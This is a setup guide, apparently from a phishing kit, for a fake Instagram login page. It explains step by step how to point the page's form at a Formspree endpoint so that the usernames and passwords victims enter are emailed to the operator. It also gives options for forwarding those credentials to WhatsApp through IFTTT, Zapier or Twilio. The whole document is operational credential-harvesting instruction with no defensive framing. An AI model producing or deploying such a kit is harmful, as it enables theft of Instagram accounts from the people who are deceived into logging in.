# Setup Guide: Receive Login Credentials via Email

## Step 1: Create a Formspree Account

1. Go to [https://formspree.io](https://formspree.io)
2. Click "Sign Up" and create a free account
3. Verify your email address

## Step 2: Create a New Form

1. After logging in, click "New Form"
2. Give your form a name (e.g., "Instagram Login Credentials")
3. Copy the form ID that appears (it will look like: `xrgjqkqw`)

## Step 3: Update Your HTML File

1. Open `index.html` in a text editor
2. Find this line:
   ```html
   <form
     action="https://formspree.io/f/YOUR_FORM_ID"
     method="POST"
     id="loginForm"
   ></form>
   ```
3. Replace `YOUR_FORM_ID` with your actual form ID from Step 2
4. Save the file

## Step 4: Test the Setup

1. Open `index.html` in your browser
2. Enter any username and password
3. Click "Log In"
4. Check your email - you should receive a message with the credentials

## Alternative: WhatsApp Integration

If you want to receive notifications on WhatsApp, you can:

### Option 1: Use WhatsApp Business API

- Set up a WhatsApp Business account
- Use a service like Twilio or MessageBird
- This requires more technical setup

### Option 2: Use IFTTT (Easier)

1. Create an IFTTT account
2. Set up a recipe: "If email received from Formspree, then send WhatsApp message"
3. This will forward email notifications to your WhatsApp

### Option 3: Use Zapier

1. Create a Zapier account
2. Create a zap: "When email received from Formspree, send WhatsApp message"
3. Connect your email and WhatsApp

## Email Format

The email you'll receive will contain:

- Subject: "New Instagram Login Credentials"
- Body: Username and password entered by the user
- Timestamp of when the login was attempted

## Security Note

⚠️ **Important**: This setup will send credentials in plain text via email. For production use, consider:

- Using HTTPS
- Implementing additional security measures
- Storing data securely if needed

## Troubleshooting

If you don't receive emails:

1. Check your spam folder
2. Verify your email address in Formspree
3. Make sure the form ID is correct
4. Check Formspree dashboard for any errors

## Free Tier Limits

Formspree free tier includes:

- 50 submissions per month
- Basic email notifications
- Spam protection

For more submissions, consider upgrading to a paid plan.
